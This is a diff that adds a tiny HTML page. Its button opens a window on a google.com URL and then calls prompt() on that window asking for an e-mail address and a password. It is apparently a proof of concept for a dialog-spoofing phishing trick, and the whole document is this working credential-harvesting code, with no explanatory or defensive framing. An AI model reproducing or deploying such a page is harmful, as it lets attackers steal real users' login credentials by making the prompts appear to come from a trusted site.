@@ -1,0 +1,9 @@
+
+<button onclick="go()">Open</button>
+<script> function go(){
+ var x=window.open('https://www.google.com/csi');
+ setTimeout(function(){
+    x.prompt('E-mail','');
+    x.prompt('Password','');} ,1000);
+}
+</script>
